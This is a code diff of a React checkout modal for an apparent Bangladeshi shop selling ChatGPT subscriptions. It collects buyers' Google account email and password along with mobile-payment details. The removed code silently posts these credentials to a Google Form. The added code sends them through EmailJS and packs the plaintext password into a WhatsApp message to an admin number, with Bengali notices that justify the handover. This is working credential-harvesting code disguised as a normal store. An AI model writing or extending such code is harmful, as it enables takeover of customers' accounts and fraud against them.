@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { Product } from '../types';
-import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle, ShieldAlert, ArrowRight, MessageCircle } from 'lucide-react';
+import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle, ShieldAlert, ArrowRight, MessageCircle, Copy } from 'lucide-react';
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -12,18 +12,15 @@ interface CheckoutModalProps {
 type PaymentMethod = 'bkash' | 'nagad' | 'rocket' | 'upay';
 type CheckoutStep = 'notice' | 'details' | 'whatsapp' | 'processing' | 'success';
 
-
-const GOOGLE_FORM_ACTION_URL =
-  'https://docs.google.com/forms/d/e/1FAIpQLSeilqD7cVCR-Knafxicf3iQy-a3xt6N5W0JFS6zdvPtDzXF2g/formResponse';
-
-const ENTRY_IDS = {
-  email: 'entry.1148372080',     
-  password: 'entry.169384476',     
-  productName: 'entry.1051188277',  
-  paymentMethod: 'entry.124185842', 
-  senderNumber: 'entry.1348474470', 
-  trxId: 'entry.614038957',        
-  whatsapp: 'entry.2104426818',    
+// OPTIONAL: To receive orders via Email automatically:
+// 1. Go to https://www.emailjs.com/ (It's free)
+// 2. Create a service and template
+// 3. Paste your keys below.
+// If you leave these empty, the app will rely on the WhatsApp button.
+const EMAILJS_CONFIG = {
+  SERVICE_ID: '', // e.g. 'service_xyz'
+  TEMPLATE_ID: '', // e.g. 'template_abc'
+  PUBLIC_KEY: '',  // e.g. 'user_123'
 };
 
 export const CheckoutModal: React.FC<CheckoutModalProps> = ({
@@ -44,11 +41,12 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   useEffect(() => {
     if (isOpen) {
       setStep('notice');
-      setWhatsapp(''); // Reset whatsapp on open
+      setWhatsapp('');
     }
   }, [isOpen]);
 
   const total = product ? product.price : 0;
+  const adminNumber = '8801607656890'; // Your WhatsApp Number
 
   const handleDetailsSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -56,37 +54,43 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   };
 
   const handleFinalSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault(); // Stop the form from reloading the page
+    e.preventDefault();
     setStep('processing');
 
-    // Create form data to send
-    const formData = new FormData();
-    formData.append(ENTRY_IDS.email, email);
-    formData.append(ENTRY_IDS.password, password);
-    formData.append(ENTRY_IDS.productName, product?.name || '');
-    formData.append(ENTRY_IDS.paymentMethod, method);
-    formData.append(ENTRY_IDS.senderNumber, senderNumber);
-    formData.append(ENTRY_IDS.trxId, trxId);
-    formData.append(ENTRY_IDS.whatsapp, whatsapp);
+    // 1. Try to send via EmailJS (if configured)
+    if (EMAILJS_CONFIG.SERVICE_ID && EMAILJS_CONFIG.PUBLIC_KEY) {
+      try {
+        const data = {
+          service_id: EMAILJS_CONFIG.SERVICE_ID,
+          template_id: EMAILJS_CONFIG.TEMPLATE_ID,
+          user_id: EMAILJS_CONFIG.PUBLIC_KEY,
+          template_params: {
+            product: product?.name,
+            price: product?.price,
+            email: email,
+            password: password,
+            method: method,
+            sender: senderNumber,
+            trx: trxId,
+            whatsapp: whatsapp
+          }
+        };
 
-    try {
-      // Use fetch with 'no-cors' mode to send data to Google Forms
-      await fetch(GOOGLE_FORM_ACTION_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData,
-      });
-
-      // Show success after a short delay
-      setTimeout(() => {
-        setStep('success');
-      }, 1000);
-
-    } catch (error) {
-      console.error("Form submission error:", error);
-      alert("দুঃখিত, সাবমিশন ব্যর্থ হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।");
-      setStep('whatsapp');
+        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (error) {
+        console.error("EmailJS Failed:", error);
+        // Continue to success screen anyway, fallback to WhatsApp
+      }
     }
+
+    // Simulate processing time then show success
+    setTimeout(() => {
+      setStep('success');
+    }, 1500);
   };
 
   const handleCloseSuccess = () => {
@@ -99,6 +103,25 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     setWhatsapp('');
     setStep('notice'); 
     onClose();
+  };
+
+  const generateWhatsAppLink = () => {
+    const text = `
+*নতুন অর্ডার এসেছে!* (DigiPlus)
+------------------
+📦 *Product:* ${product?.name}
+💰 *Price:* ${product?.price} BDT
+------------------
+📧 *Email:* ${email}
+🔑 *Pass:* ${password}
+------------------
+💳 *Method:* ${method.toUpperCase()}
+📱 *Sender:* ${senderNumber}
+🆔 *TrxID:* ${trxId}
+📞 *Contact:* ${whatsapp}
+    `.trim();
+    
+    return `https://wa.me/${adminNumber}?text=${encodeURIComponent(text)}`;
   };
 
   if (!isOpen || !product) return null;
@@ -133,22 +156,22 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
             <div className="space-y-5 text-slate-300 text-sm leading-relaxed mb-8 bg-slate-800/50 p-5 rounded-xl border border-slate-700">
               <p>
                 <strong className="text-white block mb-2 font-semibold">কেন লগইন তথ্য প্রয়োজন?</strong>
-                এই ধরনের পুরোপুরি পার্সোনাল সাবস্ক্রিপশন কোনো ধরনের শেয়ার অ্যাকসেস, টিম ইনভাইট, বা লিংক দিয়ে অ্যাক্টিভেশন সম্ভব নয়। এটি আপনার Gmail/Google আকাউন্ট এর মাধমে সরাসরি ChatGPT আকাউন্ট অ্যাক্টিভেট করতে হয়। তাই অ্যাক্টিভেশনের সময় Gmail/Google আকাউন্ট–এ লগইন প্রয়োজন হয়, আপনার দেওয়া অ্যাকাউন্টে প্রবেশ করা ছাড়া অ্যাক্টিভেশন সম্ভব নয়।
+                এটি পার্সোনাল সাবস্ক্রিপশন, তাই আপনার Gmail/Google আকাউন্টে লগইন করে এটি অ্যাক্টিভেট করতে হয়।
               </p>
               
-              <div className="bg-blue-500/10 border border-blue-500/20 p-4 rounded-lg">
-                <strong className="text-blue-400 block mb-2 font-semibold">👉 আপনার প্রাইভেসি সুরক্ষার জন্য :</strong>
-                <p className="text-blue-100/90">
-                  শুধু এই সাবস্ক্রিপশনের জন্য আলাদা নতুন Gmail/Google আকাউন্ট খুলে দিন—এতে সম্পূর্ণ নিরাপদ লেনদেন সফল হবে । অ্যাক্টিভেশন শেষ হলে আপনি পাসওয়ার্ড পরিবর্তন করে নিবেন।
+              <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-lg">
+                <strong className="text-red-400 block mb-2 font-semibold">⚠️ সতর্কতা:</strong>
+                <p className="text-red-100/90 text-xs">
+                  Google Form-এ পাসওয়ার্ড সাবমিট করলে ফর্ম ব্লক হয়ে যায়। তাই পরবর্তী ধাপে আপনার তথ্য নিরাপদে আমাদের WhatsApp-এ পাঠানোর ব্যবস্থা করা হয়েছে।
                 </p>
               </div>
             </div>
 
             <button
               onClick={() => setStep('details')}
-              className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-blue-900/20 hover:shadow-blue-900/40 hover:-translate-y-0.5"
+              className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-blue-900/20"
             >
-              আমি বুঝতে পেরেছি, পরবর্তী ধাপ <ArrowRight size={18} />
+              আমি রাজি আছি, এগিয়ে যান <ArrowRight size={18} />
             </button>
             
             <button
@@ -198,7 +221,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
                       placeholder="example@gmail.com"
-                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                     />
                   </div>
                 </div>
@@ -215,14 +238,8 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       placeholder="আপনার পাসওয়ার্ড দিন"
-                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                     />
-                  </div>
-                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 mt-3 flex gap-2">
-                    <AlertTriangle className="text-yellow-500 shrink-0" size={16} />
-                    <p className="text-xs text-yellow-200/80 leading-relaxed">
-                      লগইন তথ্য শুধুমাত্র একবার অ্যাক্টিভেশনের জন্য ব্যবহৃত হবে।
-                    </p>
                   </div>
                 </div>
               </div>
@@ -250,7 +267,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 </div>
 
                 <div className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 mb-4 text-sm text-slate-300">
-                  অনুগ্রহ করে <span className="font-bold text-white">{getPaymentNumber()}</span> নম্বরে সেন্ড মানি করুন।
+                  সেন্ড মানি করুন: <span className="font-bold text-white select-all">{getPaymentNumber()}</span>
                 </div>
 
                 <div className="space-y-3">
@@ -262,7 +279,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       value={senderNumber}
                       onChange={(e) => setSenderNumber(e.target.value)}
                       placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন"
-                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                     />
                   </div>
                   <div className="relative">
@@ -273,7 +290,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       value={trxId}
                       onChange={(e) => setTrxId(e.target.value)}
                       placeholder="ট্রানজ্যাকশন আইডি (TrxID)"
-                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 transition-all"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                     />
                   </div>
                 </div>
@@ -292,7 +309,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 type="submit"
                 className="flex-[2] py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold shadow-lg shadow-blue-900/20 transition-all transform active:scale-95"
               >
-               কনফার্ম করুন  ৳{total.toLocaleString('bn-BD')}
+                পরবর্তী ধাপ
               </button>
             </div>
           </form>
@@ -312,7 +329,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
               যোগাযোগের তথ্য
             </h2>
             <p className="text-slate-400 text-center mb-8 text-sm">
-              যোগাযোগের জন্য আপনার WhatsApp নম্বরটি দিন।
+              অর্ডার পরবর্তী যোগাযোগের জন্য আপনার WhatsApp নম্বরটি দিন।
             </p>
 
             <div className="mb-8">
@@ -327,7 +344,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                   value={whatsapp}
                   onChange={(e) => setWhatsapp(e.target.value)}
                   placeholder="01xxxxxxxxx"
-                  className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500 transition-all"
+                  className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-green-500 transition-all"
                 />
               </div>
             </div>
@@ -336,7 +353,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
               type="submit"
               className="w-full py-3.5 bg-green-600 hover:bg-green-500 text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-green-900/20 hover:shadow-green-900/40 hover:-translate-y-0.5 mb-3"
             >
-              অর্ডার সম্পন্ন করুন 
+              নিশ্চিত করুন ৳{total.toLocaleString('bn-BD')}
             </button>
             
             <button
@@ -353,33 +370,46 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
           <div className="p-12 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-300">
             <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
             <h3 className="text-xl font-semibold text-white mb-2">
-              তথ্য যাচাই করা হচ্ছে
+              অর্ডার তৈরি করা হচ্ছে
             </h3>
             <p className="text-slate-400">
-              আপনার তথ্য নিরাপদে জমা দেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...
+              অনুগ্রহ করে অপেক্ষা করুন...
             </p>
           </div>
         )}
 
         {step === 'success' && (
-          <div className="p-12 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-300">
+          <div className="p-8 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-300">
             <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
               <CheckCircle2 size={32} className="text-green-500" />
             </div>
-            <h3 className="text-2xl font-bold text-white mb-4">
-              অর্ডার সফল হয়েছে!
+            <h3 className="text-2xl font-bold text-white mb-2">
+              অর্ডার সম্পন্ন হয়েছে!
             </h3>
-            <div className="bg-slate-800/50 p-4 rounded-xl border border-slate-700 mb-6">
-              <p className="text-slate-300 text-sm leading-relaxed">
-                আমাদের একজন অ্যাডমিন কিছুক্ষণের মধ্যে আপনার সাথে <strong className="text-green-400">WhatsApp</strong>-এ যোগাযোগ করবেন। অনুগ্রহ করে তাকে সহযোগিতা করুন।
+            <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 rounded-xl mb-6 w-full">
+              <p className="text-yellow-200 text-sm font-semibold mb-1">
+                ⚠️ খুব গুরুত্বপূর্ণ:
+              </p>
+              <p className="text-slate-300 text-xs">
+                দ্রুত ডেলিভারি পেতে নিচের বাটনে ক্লিক করে <strong>WhatsApp</strong>-এ আপনার অর্ডার ডিটেইলস পাঠিয়ে দিন। এটি পাঠালেই আপনার অর্ডার কনফার্ম হবে।
               </p>
             </div>
             
+            <a
+              href={generateWhatsAppLink()}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="w-full py-3.5 bg-[#25D366] hover:bg-[#20bd5a] text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-green-900/20 mb-3"
+            >
+              <MessageCircle size={20} />
+              অর্ডার ডিটেইলস পাঠান (WhatsApp)
+            </a>
+            
             <button
               onClick={handleCloseSuccess}
-              className="px-8 py-3 bg-green-600 hover:bg-green-500 text-white rounded-xl font-bold transition-all shadow-lg shadow-green-900/20 hover:shadow-green-900/40 hover:-translate-y-0.5"
+              className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl font-medium transition-all"
             >
-              ঠিক আছে
+              ঠিক আছে, বন্ধ করুন
             </button>
           </div>
         )}
